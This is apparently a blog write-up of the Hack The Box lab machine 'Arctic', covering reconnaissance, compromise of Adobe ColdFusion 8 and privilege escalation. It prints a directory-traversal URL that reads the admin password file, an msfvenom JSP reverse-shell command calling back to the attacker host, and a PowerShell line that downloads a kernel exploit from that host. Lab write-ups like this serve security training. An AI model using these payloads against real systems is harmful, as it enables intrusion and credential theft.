@@ -1,0 +1,196 @@
+I"�6<h1 id="introduction">Introduction</h1>
+
+<p>Arctic is an “easy” Windows machine on Hackthebox.</p>
+
+<h1 id="reconnaissance--enumeration">Reconnaissance &amp; Enumeration</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/arctic# nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-oN</span> nmap.nmap 10.10.10.11
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-11 13:10 BST
+Nmap scan report <span class="k">for </span>10.10.10.11
+Host is up <span class="o">(</span>0.027s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 filtered ports
+PORT      STATE SERVICE VERSION
+135/tcp   open  msrpc   Microsoft Windows RPC
+8500/tcp  open  fmtp?
+49154/tcp open  msrpc   Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: phone|general purpose|specialized
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows Phone|2008|7|8.1|Vista|2012 <span class="o">(</span>92%<span class="o">)</span>
+OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 <span class="o">(</span>92%<span class="o">)</span>, Microsoft Windows 7 or Windows Server 2008 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2008 R2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2008 R2 or Windows 8.1 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Server 2008 R2 SP1 or Windows 8 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows 7 Professional or Windows 8 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Vista SP2 <span class="o">(</span>91%<span class="o">)</span>, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 <span class="o">(</span>90%<span class="o">)</span>, Microsoft Windows 8.1 Update 1 <span class="o">(</span>90%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>141.73 seconds
+</code></pre></div></div>
+
+<p>The scan shows two MSRPC services and one unknown that nmap couldn’t pick up. Before checking out what it is exactly, I used rpcclient and tried to connect to the two MSRPC services with anonymous credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> <span class="nt">-p</span> 135 10.10.10.11
+rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> <span class="nt">-p</span> 49154 10.10.10.11
+</code></pre></div></div>
+
+<p>Server timed out, no luck. Back to see whats running on port 8500 so navigating to that port on the browser shows the webpage.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/index.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Webpage running on port 8500</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Navigating through the directory I came across an Adobe ColdFusion8 admin portal. Note that the webpages take about 20 seconds to load so be patient.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/portal.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Adobe ColdFusion8 web portal</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Searching information about Adobe ColdFusion 8, it came out in July 2007 and the latest version is now ColdFusion 2018. ColdFusion uses its own server-side markup language (CFML) and the application itself was wrote in Java but to verify this we can view the HTTP headers using CURL.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/httpheaders.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Grabbing HTTP headers gives us more information about the server</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>So, ColdFusion is hosted on a JRun Web Server and that runs on JSP, another server-side language. Quick search on ColdFusion8 exploits and the one I used was: Adobe ColdFusion - Directory Traversal which refers to CVE-2010-2861:</p>
+<blockquote>
+  <p>“Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.”</p>
+</blockquote>
+
+<p>The exploit gives us the ability to read file paths using these parameters! Reading the exploit script it shows a directory that looks like it would show us some password properties: <code class="language-plaintext highlighter-rouge">http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</code></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/hash.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>The directory path returned a hashed password on the webpage</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The portal shows a hashed password that I could attempt to crack. You can use John the ripper or various websites. I used crackstation.net and it successfully cracked the password which turned out to be <strong>happyday</strong>. Logging into the portal you can see everything about the server from “Settings Summary” under Server Setting tab. The info shows the server is running on Windows Vista and I came across important default file paths.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/mappings.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Important directory mappings. If we get to upload files to the server we’ll use these default file paths</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>On the admin portal there is an option for “Scheduled Tasks” which gives us the ability to execute a task from a remote URL! Lovely. We know the server handles CFML and JSP so we can decide on a web shell (CFML) or a complete shell to the machine (JSP), I went for a complete shell but the CFML webshells are under <strong>/usr/share/webshells/cfm</strong> on Kali. Save the task to a file called shell.jsp using the default file path mappings above so we can execute that file from <code class="language-plaintext highlighter-rouge">http://10.10.10.11/CFIDE/&lt;file&gt;</code></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/task.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Creating a task to download a file from my python webserver</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Create a new directory to host the reverse shell file using a webserver, create a jsp reverse shell using msfvenom and setup your netcat listener. Go the <strong>http://10.10.10.11:8500/CFIDE/shell.jsp</strong> and then wait for your listener to catch that connection.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/arctic/share# msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.19 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.jsp
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/shell.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Shell access to the victim with user privs</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>If you run <code class="language-plaintext highlighter-rouge">systeminfo</code> you can see its running on Windows 2008 and there hasn’t been any patches carried out on the machine. Using Windows Exploit Suggester to find an escalation vulnerability:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/boxes/arctic# python windows-exploit-suggester.py <span class="nt">--database</span> 2020-04-10-mssb.xls <span class="nt">--systeminfo</span> systeminfo.txt <span class="nt">--quiet</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> initiating winsploit version 3.3...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> database file detected as xls or xlsx based on extension
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> attempting to <span class="nb">read </span>from the systeminfo input file
+<span class="o">[</span>+] systeminfo input file <span class="nb">read </span>successfully <span class="o">(</span>ascii<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> querying database file <span class="k">for </span>potential vulnerabilities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> comparing the 0 hotfix<span class="o">(</span>es<span class="o">)</span> against the 197 potential bulletins<span class="o">(</span>s<span class="o">)</span> with a database of 137 known exploits
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> there are now 197 remaining vulns
+<span class="o">[</span>+] <span class="o">[</span>E] exploitdb PoC, <span class="o">[</span>M] Metasploit module, <span class="o">[</span><span class="k">*</span><span class="o">]</span> missing bulletin
+<span class="o">[</span>+] windows version identified as <span class="s1">'Windows 2008 R2 64-bit'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span>M] MS13-009: Cumulative Security Update <span class="k">for </span>Internet Explorer <span class="o">(</span>2792100<span class="o">)</span> - Critical
+<span class="o">[</span>M] MS13-005: Vulnerability <span class="k">in </span>Windows Kernel-Mode Driver Could Allow Elevation of Privilege <span class="o">(</span>2778930<span class="o">)</span> - Important
+<span class="o">[</span>E] MS12-037: Cumulative Security Update <span class="k">for </span>Internet Explorer <span class="o">(</span>2699988<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS11-011: Vulnerabilities <span class="k">in </span>Windows Kernel Could Allow Elevation of Privilege <span class="o">(</span>2393802<span class="o">)</span> - Important
+<span class="o">[</span>M] MS10-073: Vulnerabilities <span class="k">in </span>Windows Kernel-Mode Drivers Could Allow Elevation of Privilege <span class="o">(</span>981957<span class="o">)</span> - Important
+<span class="o">[</span>M] MS10-061: Vulnerability <span class="k">in </span>Print Spooler Service Could Allow Remote Code Execution <span class="o">(</span>2347290<span class="o">)</span> - Critical
+<span class="o">[</span>E] MS10-059: Vulnerabilities <span class="k">in </span>the Tracing Feature <span class="k">for </span>Services Could Allow Elevation of Privilege <span class="o">(</span>982799<span class="o">)</span> - Important
+<span class="o">[</span>E] MS10-047: Vulnerabilities <span class="k">in </span>Windows Kernel Could Allow Elevation of Privilege <span class="o">(</span>981852<span class="o">)</span> - Important
+<span class="o">[</span>M] MS10-002: Cumulative Security Update <span class="k">for </span>Internet Explorer <span class="o">(</span>978207<span class="o">)</span> - Critical
+<span class="o">[</span>M] MS09-072: Cumulative Security Update <span class="k">for </span>Internet Explorer <span class="o">(</span>976325<span class="o">)</span> - Critical
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="k">done</span>
+</code></pre></div></div>
+
+<p>After some trial and error, MS10-059 gave me that root shell :)</p>
+
+<pre><code class="language-windows">C:\Users\tolis\Desktop&gt;powershell.exe -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.19:8000/MS10-059.exe','C:\Users\tolis\Desktop\exploit.exe')"
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center"><img src="/assets/img/htb/arctic/exploit.png" alt="image" /></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center"><em>Running the exploit</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/htb/arctic/root.png" alt="image" /></p>
+
+<p>Boom, root privelleges.</p>
+:ET
